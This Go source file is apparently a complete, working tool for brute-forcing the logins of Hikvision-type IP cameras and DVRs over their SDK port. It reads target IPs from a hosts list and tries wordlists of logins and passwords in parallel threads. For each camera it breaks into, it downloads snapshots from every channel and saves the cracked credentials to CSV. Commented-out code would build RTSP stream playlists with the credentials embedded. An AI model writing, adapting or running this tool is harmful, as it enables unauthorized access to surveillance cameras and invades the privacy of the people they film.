package main

/*
#include "HCNetSDK.h"
*/
import "C"
import (
  "strconv"
  "fmt"
  "unsafe"
  "sync"
  "net"
  "os"
  "bufio"
  "flag"
  "encoding/binary"
  "time"
  "encoding/csv"
  // "encoding/json"
  "github.com/fatih/color"
)

var threads         int
var port            uint16
var ping            bool
var logins_file     string
var passwords_file  string
var shoots_path     string
var json_file       string
var csv_file        string
var m3u_file        string

var logins    []string
var passwords []string

var err   *color.Color
var info  *color.Color
var warn  *color.Color
var succ  *color.Color

type CameraAddress struct {
  IP    string  `json:"ip"`
  Port  uint16  `json:"port"`
}

type DeviceInfo struct {
  Login         string        `json:"user"`
  Password      string        `json:"password"`
  StartChannel  uint8         `json:"start_channel"`
  ChannelsCount uint8         `json:"channels"`
  Address       CameraAddress `json:"address"`
}

// type JsonResult struct {
//   Authorized    []DeviceInfo    `json:"authorized"`
//   Unauthorized  []CameraAddress `json:"unauthorized"`
// }

// TODO:
//   Look at these timeouts! Do something with them.
func HPRPing(ip string) bool {
  request := []byte {
    0x00, 0x00, 0x00, 0x20, 0x63, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  }

  var response [16]byte

  conn, err := net.DialTimeout("tcp", ip + ":" + strconv.Itoa(int(port)), 3 * time.Second)
  if (err != nil) {
    return false
  }
  defer conn.Close()

  conn.SetDeadline(time.Now().Add(5*time.Second))
  conn.SetWriteDeadline(time.Now().Add(3*time.Second))
  conn.SetReadDeadline(time.Now().Add(3*time.Second))

  err = binary.Write(conn, binary.LittleEndian, request)
  if (err != nil) {
    return false
  }

  err = binary.Read(conn, binary.LittleEndian, &response)
  if (err != nil) {
    return false
  }

  return ((response[3] == 0x10) && (response[7] == response[11]))
}

func grabShoots(ip string, uid int64, startChannel int, count int, login string, password string) {
  if (count == 0) {
    warn.Println("No cameras on", ip)

    return
  }


  downloaded := 0

  for i := startChannel; i < startChannel + count; i++ {
    filename := fmt.Sprintf("%s%s_%s_%s_%d.jpg", shoots_path, login, password, ip, i)

    var imgParams C.NET_DVR_JPEGPARA
    imgParams.wPicQuality = 2
    imgParams.wPicSize = 0

    result := C.NET_DVR_CaptureJPEGPicture(
      (C.LONG)(uid),
      (C.LONG)(i),
      (*C.NET_DVR_JPEGPARA)(unsafe.Pointer(&imgParams)),
      C.CString(filename),
    )

    if (result == 0) {
      err.Println("Error while downloading a snapshot from", ip, ":", (int)(C.NET_DVR_GetLastError()))
    } else {
      os.Chmod(filename, 0644)
      downloaded++
    }
  }


  if (downloaded != 0) {
    info.Println("Downloaded", downloaded, "photos from", ip)
  } else {
    warn.Println("Can't get photos from", ip)
  }
}

func bruteforce(ip string, results chan DeviceInfo) {
  if (ping) {
    if (!HPRPing(ip)) {
      err.Println(ip, "is dead")

      return
    }
  }


  for _, login := range logins {
    for _, password := range passwords {
      var device C.NET_DVR_DEVICEINFO_V30

      uid := (int64)(C.NET_DVR_Login_V30(
        C.CString(ip),
        C.WORD(port),
        C.CString(login),
        C.CString(password),
        (*C.NET_DVR_DEVICEINFO_V30)(unsafe.Pointer(&device)),
      ))

      if (uid >= 0) {
        succ.Printf("Logged in: %s:%s@%s\n", login, password, ip)

        if (shoots_path != "") {
          var ipcfg C.NET_DVR_IPPARACFG
          var written int32

          if (C.NET_DVR_GetDVRConfig(
            (C.LONG)(uid),
            C.NET_DVR_GET_IPPARACFG,
            0,
            (C.LPVOID)(unsafe.Pointer(&ipcfg)),
            (C.DWORD)(unsafe.Sizeof(ipcfg)),
            (*C.uint32_t)(unsafe.Pointer(&written)),
          ) == 1) {
            var count C.BYTE = 0
            for i := 0; i < C.MAX_IP_CHANNEL && ipcfg.struIPChanInfo[i].byEnable == 1; i++ {
              count++
            }

            if (count > 0) {
              device.byChanNum    = count
              device.byStartChan += 32
            }
          }

          grabShoots(
            ip,
            uid,
            (int)(device.byStartChan),
            (int)(device.byChanNum),
            login,
            password,
          )
        }

        results <- DeviceInfo{
          login,
          password,
          (uint8)(device.byStartChan),
          (uint8)(device.byChanNum),
          CameraAddress{ip, port},
        }

        C.NET_DVR_Logout_V30((C.LONG)(uid))

        return
      }
    }
  }


  warn.Println("Can't log into", ip)
  results <- DeviceInfo{Address: CameraAddress{ip, port}}
}


func readLines(path string) ([]string, error) {
  file, err := os.Open(path)
  if err != nil {
    return nil, err
  }
  defer file.Close()

  var lines []string
  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
    lines = append(lines, scanner.Text())
  }
  return lines, scanner.Err()
}

func dumpAuthCSV(file *os.File, devices *[]DeviceInfo) {
  writer := csv.NewWriter(file)
  for _, cam := range *devices {
    writer.Write([]string{
      cam.Address.IP,
      strconv.Itoa((int)(cam.Address.Port)),
      cam.Login,
      cam.Password,
    })
  }
  
  writer.Flush()
  err := writer.Error()
  if (err != nil) {
    panic(err)
  }

  *devices = nil
}

func dumpGoodCSV(file *os.File, devices *[]CameraAddress) {
  writer := csv.NewWriter(file)
  for _, addr := range *devices {
    writer.Write([]string{
      addr.IP,
      strconv.Itoa((int)(addr.Port)),
    })
  }

  writer.Flush()
  err := writer.Error()
  if (err != nil) {
    panic(err)
  }

  *devices = nil
}

func parseFlags() {
  flag.IntVar(&threads, "threads", 1, "Threads count")
  port = (uint16)(*flag.Int("port", 8000, "Camera service port"))
  flag.BoolVar(&ping, "check", false, "Check cameras (experimental and not fully tested, but very useful)")
  flag.StringVar(&logins_file, "logins", "logins", "A file with a list of logins to bruteforce")
  flag.StringVar(&passwords_file, "passwords", "passwords", "A file with a list of passwords to bruteforce")
  flag.StringVar(&shoots_path, "shoots", "", "Download pics from cameras into a folder")
  flag.StringVar(&csv_file, "csv", "", "Write result to CSV")
  flag.StringVar(&json_file, "json", "", "Write result to JSON")
  flag.StringVar(&m3u_file, "m3u", "", "Write result to m3u playlist")
  flag.Parse()
}

func initialize() {
  // No shadowing pls
  var err error

  logins, err = readLines(logins_file)
  if (err != nil) {
    fmt.Println(err)

    return
  }
  fmt.Println("Loaded", len(logins), "logins")

  passwords, err = readLines(passwords_file)
  if (err != nil) {
    fmt.Println(err)

    return
  }
  fmt.Println("Loaded", len(passwords), "passwords")

  
  // Creating a directory for pics
  if (shoots_path != "") {
    if (string(shoots_path[len(shoots_path) - 1]) != string(os.PathSeparator)) {
      shoots_path += string(os.PathSeparator)
    }

    err = os.MkdirAll(shoots_path, 0777)
    if (err != nil) {
      fmt.Println(err)

      return
    }
  }


  fmt.Println("Starting work in", threads, "threads")
  fmt.Println()
}

func start() {
  // Results are stored here
  var authorized    []DeviceInfo
  var unauthorized  []CameraAddress


  // no shadowing pls
  var err error


  // Creating a CSV file for results
  var csv *os.File
  if (csv_file != "") {
    csv, err = os.Create(csv_file)
    if (err != nil) {
      panic(err)
    }
    defer csv.Close()
  }
  defer dumpAuthCSV(csv, &authorized)
  defer dumpGoodCSV(csv, &unauthorized)


  // Catching results here.
  // Is this a good practice to send a structure with empty fields?
  // Maybe I should make it with two channels.
  results := make(chan DeviceInfo)
  defer close(results)

  go func() {
    for li := range results {
      if (csv_file != "") {
        if (li.Login != "") {
          authorized = append(authorized, li)

          if (len(authorized) >= 10) {
            dumpAuthCSV(csv, &authorized)
          }
        } else {
          unauthorized = append(unauthorized, li.Address)

          if (len(unauthorized) >= 10) {
            dumpGoodCSV(csv, &unauthorized)
          }
        }
      }
    }
  }()

  
  // Spawning main bruteforce coroutines
  ipCh  := make(chan string)
  bg    := new(sync.WaitGroup)

  for i := 0; i < threads; i++ {
    bg.Add(1)
    go func() {
      defer bg.Done()
      for ip := range ipCh {
        bruteforce(ip, results)
      }
    }()
  }

  
  // Sending IPs to bruteforce coroutines
  inFile, err := os.Open("hosts")
  if (err != nil) {
    panic(err)
  }
  defer inFile.Close()

  scanner := bufio.NewScanner(inFile)
  scanner.Split(bufio.ScanLines)
  for scanner.Scan() {
    ipCh <- scanner.Text()
  }
  close(ipCh)


  bg.Wait()
}

func main() {
  C.NET_DVR_Init()
  defer C.NET_DVR_Cleanup()
  
  // No such function in windows lib
  // C.NET_DVR_SetRecvTimeOut(3000);

  parseFlags()

  err   = color.New(color.FgRed, color.Bold)
  info  = color.New(color.FgBlue, color.Bold)
  warn  = color.New(color.FgYellow, color.Bold)
  succ  = color.New(color.FgGreen, color.Bold)

 
  initialize()

  start()

  
  // if (json_file != "") {
  //   color.New(color.FgBlue, color.Bold).Println("Writing JSON to", json_file)

  //   j, err := json.MarshalIndent(
  //     JsonResult{
  //       Authorized: authorized,
  //       Unauthorized: unauthorized,
  //     },
  //     "",
  //     "  ",
  //   )
  //   if (err != nil) {
  //     panic(err)
  //   }

  //   f, err := os.Create(json_file)
  //   if (err != nil) {
  //     panic(err)
  //   }

  //   defer f.Close()

  //   f.WriteString(string(j))
  // }

  // if (m3u_file != "") {
  //   color.New(color.FgBlue, color.Bold).Println("Writing m3u playlist to", m3u_file)

  //   f, err := os.Create(m3u_file)
  //   if (err != nil) {
  //     panic(err)
  //   }
  //   defer f.Close()

  //   writer := bufio.NewWriter(f)
  //   writer.WriteString("#EXTM3U\n")

  //   for index, cam := range authorized {
  //     for channel := cam.StartChannel; channel < cam.StartChannel + cam.ChannelsCount; channel++ {
  //       writer.WriteString(
  //         fmt.Sprintf(
  //           "#EXTINF:1,%d_%d\n",
  //           index,
  //           channel - cam.StartChannel + 1,
  //         ),
  //       )

  //       writer.WriteString(
  //         fmt.Sprintf(
  //           "rtsp://%s:%s@%s/mpeg4/ch%02d/main/av_stream",
  //           cam.Login,
  //           cam.Password,
  //           cam.Address.IP,
  //           channel,
  //         ),
  //       )
  //     }
  //   }

  //   writer.Flush()
  // }
}
